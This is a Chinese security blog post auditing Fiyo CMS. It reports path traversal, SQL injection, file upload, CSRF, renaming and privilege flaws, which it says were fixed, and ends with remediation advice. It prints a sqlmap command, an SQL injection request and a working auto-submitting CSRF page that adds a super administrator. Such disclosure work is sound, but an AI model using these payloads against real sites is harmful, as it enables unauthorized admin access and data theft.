***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

***本文原创作者：Mochazz，本文属FreeBuf原创奖励计划，未经许可禁止转载**

##  前言

 **Fiyo CMS是小型的商务电话服务及移动合作工具，由一名前职业学校学生首次开发和创建的，后者当时在RPL的SMK 10三宝垄学习。
那时他的名字不是Fiyo CMS，而是Sirion，它是Site Administration的首字母缩写。**

PS：虽然网上有一些分析文章，但是通过本次审计，还是发现了一些其他的漏洞，再次做个总结，漏洞触发过程均以gif图片来展示。

##  审计漏洞

###  任意文件删除

漏洞文件位置： **dapur\apps\app_config\controller\backuper.php** ，实际上这个cms多处都存在这个问题。

![](https://image.3001.net/images/20180601/15278251518749.png!small)

可以非常明确的看到这个程序供的大部分功能都是用于备份，但是POST传过去的参数又不经过过滤直接和路径进行拼接(第10行)，导致路径穿越，再结合
**unlink** 函数就导致了任意文件删除。下面看这个的攻击demo：

![](https://image.3001.net/2018/06/e0937811bf85eb48bba3a437b49e96ec.gif)

点击查看原图  

###  SQL注入点

注入点一：

该cms的update方法中存在SQL注入，可以看到程序对变量 **$where** 直接进行了拼接，具体代码如下：

![](https://image.3001.net/images/20180601/15278251912779.png!small)

举个例子，我们对 **dapur\apps\app_user\controller\status.php**
文件进行SQL注入，这里直接用sqlmap进行验证，后台用户身份，访问链接
[http://192.168.43.229/fiyocms/dapur/apps/app_user/controller/status.php?stat=1&id=1](http://192.168.43.229/fiyocms/dapur/apps/app_user/controller/status.php?stat=1&id=1)
保存请求包为 **headers.txt** ，将参数 **id=1** 改成 **id=1*** ，然后使用命令sqlmap -r headers.txt
--batch --dbs ，效果如下：

![](https://image.3001.net/images/20180601/15278252409465.png!small)

注入点二：

待绕过

    
    
    POST /fiyocms/dapur/index.php?app=menu&view=edit&id=126'`test%23&theme=blank HTTP/1.1
    Host: 192.168.199.229
    Content-Length: 10
    Accept: */*
    Origin: http://192.168.199.229
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Referer: http://192.168.199.229/fiyocms/dapur/index.php?app=menu&view=controller
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=dl8r6oo3lmi0c8lr5upveckl11
    Connection: close
    blank=true
    
    
    响应结果
    string(55) "SELECT id FROM fiyo25_menu WHERE id='126`test#' LIMIT 1"

漏洞文件在system\function.php 中的 **oneQuery** 方法。

    
    
    function oneQuery($table,$field,$value,$output = null) {
        $value = str_replace("'","",$value);
        $query = FQuery($table,"$field='$value'",$output,null,null,$output,1);
        return $query;    
    }

#### ![](https://image.3001.net/images/20180601/15278252779058.png!small)

###  文件读取漏洞

这里只能读取后缀为：html、htm、xhtml、js、jsp、php、css、xml 的任意文件，漏洞文件在
**dapur\apps\app_theme\libs\check_file.php** 中，第5行代码未对$_GET[src] 和 $_GET[name]
变量进行过滤，导致路径穿越，结合 **file_get_contents** 函数，造成文件读取漏洞。

![](https://image.3001.net/images/20180601/15278253048671.png!small)

效果如下：

![](https://image.3001.net/images/20180601/15278254076307.png!small)

任意文件上传漏洞

这个漏洞是在登录后台的时候，发现有个文件管理的功能。于是查看了一下程序源代码，果然没有过滤。看下图最后四行代码，又是路径穿越，也不检查文件后缀名。

![](https://image.3001.net/images/20180601/15278254412095.png!small)

效果如下：

![](https://image.3001.net/images/20180601/1527825458940.gif!small)

###  CSRF添加超级用户

漏洞位置 **dapur\apps\app_user\sys_user.php** ，代码如下：

![](https://image.3001.net/images/20180601/15278254867141.png!small)

可以看到该程序实现了添加用户的功能，但是并没有使用token来防止CSRF攻击，所以我们可以很容易的构造如下POC：

    
    
    <html>
        <body>
            <script>history.pushState('', '', '/')</script>
            <form name="csrf" action="http://192.168.199.229/fiyocms/dapur/index.php?app=user&act=add" method="POST">
            <input type="hidden" name="apply" value="Next" />
            <input type="hidden" name="id" value="" />
            <input type="hidden" name="z" value="" />
            <input type="hidden" name="user" value="test10" />
            <input type="hidden" name="z" value="" />
            <input type="hidden" name="x" value="" />
            <input type="hidden" name="password" value="admin" />
            <input type="hidden" name="kpassword" value="admin" />
            <input type="hidden" name="email" value="test&#64;test&#46;com" />
            <input type="hidden" name="level" value="1" />
            <input type="hidden" name="name" value="admin" />
            <input type="hidden" name="status" value="1" />
            <input type="hidden" name="bio" value="" />
            <input type="submit" value="Submit request" id="autoSub" />
            </form>
            <script type="text/javascript">
                function sub() {    //点击链接，模拟用户动作，直接提交表单。
                    document.csrf.submit()
                }
                setTimeout(sub, 10)
            </script>
        </body>
    </html>

当管理员点击我们构造好的页面<http://192.168.199.229/csrf.html> ，将添加一个test10用户到Super
Administrator组

###
![](https://image.3001.net/images/20180601/15278255325621.png!small)任意文件名修改漏洞

漏洞位置 **dapur\apps\app_config\sys_config.php**
，本来程序提供的功能是修改后台路径，但是对变量进行过滤，代码如下：

![](https://image.3001.net/images/20180601/15278255674058.png!small)

我们可以将 **config.php** 修改成 **config.txt** ，然后直接查看网站配置信息。

![](https://image.3001.net/images/20180601/15278256083992.png!small)

###  越权漏洞

fiyocms一共设置了5个用户组，等级为1-5，权限依次降低，而只有等级1-3有权限登录后台，不同等级具有不同的权限。

    
    
    super administrator = 1
    administrator = 2
    editor = 3
    publisher = 4
    member = 5

漏洞文件在 **dapur\apps\app_user\sys_user.php**
，可以看到程序在对用户账户进行操作前，并没有对用户的身份进行确认或者说没有对用户的权限进行检查，这也是越权漏洞产生的原因。

![](https://image.3001.net/images/20180601/15278256383479.png!small)

攻击演示如下：

![](https://image.3001.net/2018/06/277ea67213a54a556b9f9f4888fd3605.gif)

##  总结

可以看到，该CMS存在很多与文件相关的漏洞，究其原因，就是没有对变量进行路径符号的过滤。至于CSRF和越权漏洞，应对用户身份进行确认、增加token值检测，从而避免这类漏洞的发生。本次审计由于前台提供的功能较少，所以基本上挖掘的都是后台的漏洞。笔者为了节省审计时间，直接根据后台提供的功能，找到相应代码进行审计，这样能大大加快审计速度。

##  相关资料

> [Fiyo CMS 2.0.6.1 - Privilege Escalation](https://www.exploit-> db.com/exploits/41594/)
>
> [代码审计| fiyocms的多个漏洞集合](http://www.freebuf.com/column/158950.html)
>
> [fiyocms github项目地址](https://github.com/FiyoCMS/FiyoCMS/)

***本文原创作者：Mochazz，本文属FreeBuf原创奖励计划，未经许可禁止转载**

